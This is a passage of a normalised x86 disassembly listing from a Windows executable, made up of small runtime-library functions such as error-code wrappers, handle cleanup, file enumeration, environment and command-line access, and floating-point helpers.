mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_42f637
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f647
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f659
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f669
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f679
mov edi edi
push esi
mov esi ecx
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax esi
pop esi
retn
sub_42f68a
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42f69c
push [ ecx ]
call [ SetLastError@IAT ]
retn
sub_42f6a5
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42f6ad
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42f6b6
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42f6bf
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42f6c8
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42f6f5
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42f6fe
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42f707
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42f710
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_42f992
pop ecx
pop ecx
retn
sub_42f723
mov eax [ ecx ]
push 0x0
push [ eax ]
call sub_42f992
pop ecx
pop ecx
retn
sub_42f731
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42f73a
mov eax [ ecx ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
retn
sub_42f7be
mov edi edi
push ebp
mov ebp esp
push rw-data
push [ ebp + 0x8 ]
call sub_42f745
pop ecx
pop ecx
pop ebp
retn
sub_42f7d4
mov eax ecx
retn
j_sub_42f7f8
jmp sub_42f7f8
sub_42f898
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42f89e
mov eax [ ecx ]
retn
sub_42f978
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42f980
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42f9dd
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
push eax
call sub_43085f
retn
xor eax eax
retn
sub_42fb52
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_430809
or [ rw-data ] 0xffffffff
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
sub_42fb78
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_42fbde
mov eax ecx
retn
sub_42fd1c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_42fbad
pop ebp
retn
sub_42fd30
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_42fd43
call sub_42faa1
test eax eax
jne r-xdata
mov eax [ eax + 0x35c ]
retn
retn
sub_42fe5f
mov edi edi
push ebp
mov ebp esp
call sub_42fa1d
mov ecx [ ebp + 0x8 ]
mov edx eax
mov eax [ edx + 0x35c ]
mov [ edx + 0x35c ] ecx
pop ebp
retn
sub_42ffda
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_43006a
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43009e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_4300d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4300e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4300f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_430107
mov eax sub_42ff94
retn
sub_43010d
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_430151
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43019a
or eax 0xffffffff
retn
sub_43019e
push r--data
push r--data
push r--data
push 0x0
call sub_430502
add esp 0x10
retn
sub_4301b8
push r--data
push r--data
push r--data
push 0x1
call sub_430502
add esp 0x10
retn
sub_4301d2
push r--data
push r--data
push r--data
push 0x2
call sub_430502
add esp 0x10
retn
sub_4301ec
push r--data
push r--data
push r--data
push 0x3
call sub_430502
add esp 0x10
retn
sub_430206
push r--data
push r--data
push r--data
push 0x4
call sub_430502
add esp 0x10
retn
sub_430220
push r--data
push r--data
push r--data
push 0x5
call sub_430502
add esp 0x10
retn
sub_43023a
push r--data
push r--data
push r--data
push 0x6
call sub_430502
add esp 0x10
retn
sub_430254
push r--data
push r--data
push r--data
push 0x7
call sub_430502
add esp 0x10
retn
sub_43026e
push r--data
push r--data
push r--data
push 0x8
call sub_430502
add esp 0x10
retn
sub_430288
push r--data
push r--data
push r--data
push 0x9
call sub_430502
add esp 0x10
retn
sub_4302a2
push r--data
push r--data
push r--data
push 0xa
call sub_430502
add esp 0x10
retn
sub_4302bc
push r--data
push r--data
push r--data
push 0xb
call sub_430502
add esp 0x10
retn
sub_4302d6
push r--data
push r--data
push r--data
push 0xc
call sub_430502
add esp 0x10
retn
sub_4302f0
push r--data
push r--data
push r--data
push 0xd
call sub_430502
add esp 0x10
retn
sub_43030a
push r--data
push r--data
push r--data
push 0xe
call sub_430502
add esp 0x10
retn
sub_430324
push r--data
push r--data
push r--data
push 0xf
call sub_430502
add esp 0x10
retn
sub_43033e
push r--data
push r--data
push r--data
push 0x10
call sub_430502
add esp 0x10
retn
sub_430358
push r--data
push r--data
push r--data
push 0x11
call sub_430502
add esp 0x10
retn
sub_430372
push r--data
push r--data
push r--data
push 0x12
call sub_430502
add esp 0x10
retn
sub_43038c
push r--data
push r--data
push r--data
push 0x13
call sub_430502
add esp 0x10
retn
sub_4303a6
push r--data
push r--data
push r--data
push 0x14
call sub_430502
add esp 0x10
retn
sub_4303c0
push r--data
push r--data
push r--data
push 0x15
call sub_430502
add esp 0x10
retn
sub_4303da
push r--data
push r--data
push r--data
push 0x17
call sub_430502
add esp 0x10
retn
sub_4303f4
push r--data
push r--data
push r--data
push 0x16
call sub_430502
add esp 0x10
retn
sub_43040e
push r--data
push r--data
push r--data
push 0x18
call sub_430502
add esp 0x10
retn
sub_430428
push r--data
push r--data
push r--data
push 0x19
call sub_430502
add esp 0x10
retn
sub_430442
push r--data
push r--data
push r--data
push 0x1a
call sub_430502
add esp 0x10
retn
sub_43045c
push r--data
push r--data
push r--data
push 0x1b
call sub_430502
add esp 0x10
retn
sub_430476
push r--data
push r--data
push r--data
push 0x1c
call sub_430502
add esp 0x10
retn
sub_430490
push r--data
push r--data
push r--data
push 0x1d
call sub_430502
add esp 0x10
retn
sub_4304aa
push r--data
push r--data
push r--data
push 0x1e
call sub_430502
add esp 0x10
retn
sub_4304c4
push r--data
push r--data
push r--data
push 0x1f
call sub_430502
add esp 0x10
retn
sub_43105f
call sub_430442
test eax eax
je r-xdata
xor eax eax
retn
call sub_43045c
test eax eax
je r-xdata
xor eax eax
inc eax
retn
sub_431078
call sub_4301b8
neg eax
sbb eax eax
neg eax
retn
sub_431084
call sub_430428
neg eax
sbb eax eax
neg eax
retn
sub_431298
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43133f
push 0x8
call sub_42f374
pop ecx
retn
sub_431348
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax [ ebp + 0x8 ]
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
pop ebp
retn 0x4
sub_431436
push 0x1
call sub_43143f
pop ecx
retn
sub_4314e4
push [ ebp - 0x28 ]
call sub_4173c0
pop ecx
retn
sub_43150e
push 0x8
call sub_42f374
pop ecx
retn
sub_431568
push esi
call sub_4173c0
pop ecx
retn
sub_431570
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0x6
and eax 0x1
retn
sub_431795
push 0x7
call sub_42f374
pop ecx
retn
sub_4317ca
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_4317dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4317ec
and [ ecx ] 0x0
mov eax ecx
retn
sub_4317f2
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43185a
push 0x8
call sub_42f374
pop ecx
retn
sub_43189e
mov eax [ ecx ]
xor edx edx
add eax 0xc
xchg [ eax ] edx
retn
sub_4318a8
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_431971
push [ ecx ]
call sub_4173ac
pop ecx
retn
sub_43197a
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_431f2d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e240
add esp 0xc
pop ebp
retn
sub_431f49
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43acc8
add esp 0xc
pop ebp
retn
sub_431f65
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e2b8
add esp 0xc
pop ebp
retn
sub_431f81
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e2b8
add esp 0xc
pop ebp
retn
sub_431f9d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e2b8
add esp 0xc
pop ebp
retn
sub_431fb9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e07b
add esp 0xc
pop ebp
retn
sub_431fd5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e07b
add esp 0xc
pop ebp
retn
sub_431ff1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43e07b
add esp 0xc
pop ebp
retn
sub_432078
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ eax ] 0x80
mov al 0x1
pop ebp
retn
sub_43219e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_431e23
sub_4321a9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_431ea8
sub_43222a
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4390d5
pop ecx
retn
sub_43225e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_432270
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_432280
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_432292
push [ ecx ]
call sub_43901e
pop ecx
retn
sub_4322d4
push [ ecx ]
call sub_4390d5
pop ecx
retn
sub_432462
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
retn
sub_432b2e
push esi
call sub_4390d5
pop ecx
retn
sub_433129
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_432d63
sub_433134
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_432e74
sub_43313f
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0x9
and eax 0x1
retn
sub_433239
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_43324f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_4332a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_433aad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x94 ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
pop ebp
retn
sub_433ac6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x98 ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
pop ebp
retn
sub_433adf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_433b06
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
pop ebp
retn
sub_433b13
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x200
push [ ebp + 0x8 ]
call sub_4337df
add esp 0xc
pop ebp
retn
sub_434447
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43434d
add esp 0x10
pop ebp
retn
sub_434609
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4344b4
add esp 0x14
pop ebp
retn
sub_434bba
vzeroupper
retn
sub_434bbe
vpcmpeqb ymm0 ymm0 ymm1
retn
sub_434bc3
vpcmpeqw ymm0 ymm0 ymm1
retn
sub_434bc8
pcmpeqb xmm0 xmm1
retn
sub_434bcd
pcmpeqw xmm0 xmm1
retn
sub_434bd2
vpmovmskb eax ymm0
retn
sub_434bd7
pmovmskb eax xmm0
retn
sub_434bdc
vxorps ymm0 ymm0 ymm0
retn
sub_434be1
pxor xmm0 xmm0
retn
sub_4357e9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44cab0
sub_435a96
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_41730a
push eax
push [ ebp + 0x8 ]
call sub_435abb
add esp 0xc
pop ebp
retn
sub_435ab0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435970
sub_435b2e
push esi
call sub_4173c0
pop ecx
retn
sub_435b36
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435abb
sub_435b41
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435a96
sub_435b75
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_41730a
push eax
push [ ebp + 0x8 ]
call sub_435b9a
add esp 0xc
pop ebp
retn
sub_435b8f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435b4c
sub_435c96
push esi
call sub_4173c0
pop ecx
retn
sub_435c9e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435b9a
sub_435ca9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435b75
sub_435cb4
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_435d20
call sub_435d5c
xchg cl ch
jmp r-xdata
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_435d8c
fstp st0
fld [ r--data ]
retn
sub_435db8
fstp st0
mov cl ch
jmp r-xdata
call sub_435d8c
jmp sub_443d8d
sub_435e98
and [ ebp - 0x2c8 ] 0xfe
sub_4360ef
lea edx [ esp + 0x4 ]
call sub_4440f5
sub_43621f
lea edx [ esp + 0x4 ]
call sub_4440f5
sub_436500
sub esp 0xc
fst [ esp ]
call sub_444138
call sub_43651d
add esp 0xc
retn
sub_436514
lea edx [ esp + 0x4 ]
call sub_4440f5
sub_436b32
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ OutputDebugStringA@IAT ]
pop ebp
retn
sub_436b44
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ OutputDebugStringW@IAT ]
pop ebp
retn
sub_436b56
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_436b66
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
or [ esi ] 0xffffffff
sub_436b7d
xor eax eax
cmp [ ecx ] 0xffffffff
setne al
retn
sub_436b86
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
or [ esi ] 0xffffffff
sub_436b9d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_436bb3
mov eax [ ecx ]
retn
sub_436bb6
or eax 0xffffffff
retn
sub_436bba
xor eax eax
cmp [ ecx ] 0xffffffff
setne al
retn
sub_436bc3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43687c
sub_436bce
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_436955
sub_43742a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindNextFileA@IAT ]
pop ebp
retn
sub_437441
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindNextFileW@IAT ]
pop ebp
retn
sub_437560
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_4449b0
pop ecx
pop ecx
pop ebp
retn
sub_437576
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43ad02
pop ecx
pop ecx
pop ebp
retn
sub_43758c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43759c
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov eax ecx
retn
sub_4375a9
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov eax ecx
retn
sub_4375b6
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
sub_437617
mov eax sub_436bd9
retn
sub_43761d
mov eax sub_436bf1
retn
sub_4376d1
mov eax [ ecx ]
retn
sub_4376d4
mov eax [ ecx ]
retn
sub_4376d7
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
sub_4376ee
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_437704
mov eax [ ecx + 0x4 ]
retn
sub_437708
mov eax [ ecx + 0x4 ]
retn
sub_43781a
mov eax [ ecx ]
retn
sub_43781d
or eax 0xffffffff
retn
sub_437821
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4449f0
sub_43782c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add eax 0xfffffffe
pop ebp
retn
sub_437839
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_437842
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_43784b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4449b0
sub_437856
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43ad02
sub_437861
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_436c09
sub_43786c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_436d99
sub_4378ae
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_4378e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4378f4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_437906
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_437916
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43791f
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_437d97
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
retn
push 0x1
push 0xfffffffd
call sub_437c96
pop ecx
pop ecx
mov [ rw-data ] 0x1
sub_437e46
push 0x5
call sub_42f374
pop ecx
retn
sub_437e57
mov eax rw-data
retn
sub_437e5d
mov eax rw-data
retn
sub_437e99
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_437c96
pop ecx
pop ecx
pop ebp
retn
sub_438177
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438192
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4381ae
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4381c9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_43822c
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438247
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438263
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_43827b
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438294
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4382a7
pop ecx
pop ecx
pop ebp
retn
sub_4382f8
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438310
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438329
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438341
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_43835a
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438372
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_43838b
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4383a6
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4383c2
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4383da
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_4383f3
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
sub_43840b
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
sub_438424
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
mov al 0x1
retn
sub_43843d
mov al 0x1
retn
sub_438440
mov eax rw-data
retn
sub_438446
mov eax rw-data
retn
sub_43844c
mov eax rw-data
retn
sub_438452
mov eax rw-data
retn
sub_438458
mov eax rw-data
retn
sub_43845e
mov eax rw-data
retn
sub_438464
mov eax rw-data
retn
sub_4384cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4384dc
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeEnvironmentStringsW@IAT ]
and [ esi ] 0x0
sub_4384f3
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_4384fb
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeEnvironmentStringsW@IAT ]
and [ esi ] 0x0
sub_438512
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FreeEnvironmentStringsW@IAT ]
mov al 0x1
pop ebp
retn
sub_43855b
mov eax [ ecx ]
retn
sub_43855e
xor eax eax
retn
sub_438561
xor eax eax
cmp [ ecx ] eax
setne al
retn
j_sub_42a53e
jmp j_sub_42a53e#2
j_sub_42a56d
jmp j_sub_42a56d#2
sub_438cd8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ SetEnvironmentVariableA@IAT ]
pop ebp
retn
sub_438cef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ SetEnvironmentVariableW@IAT ]
pop ebp
retn
sub_438e28
mov eax rw-data
retn
sub_438e2e
mov eax rw-data
retn
sub_438e34
mov eax rw-data
retn
sub_438e3a
mov eax rw-data
retn
sub_438e40
mov eax rw-data
retn
sub_438e46
mov eax rw-data
retn
sub_438e4c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44cbf0
sub_438e57
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44cd1b
sub_438e62
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43863c
sub_438e6d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_438877
sub_438e78
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_438e8a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_438e9a
mov edi edi
push esi
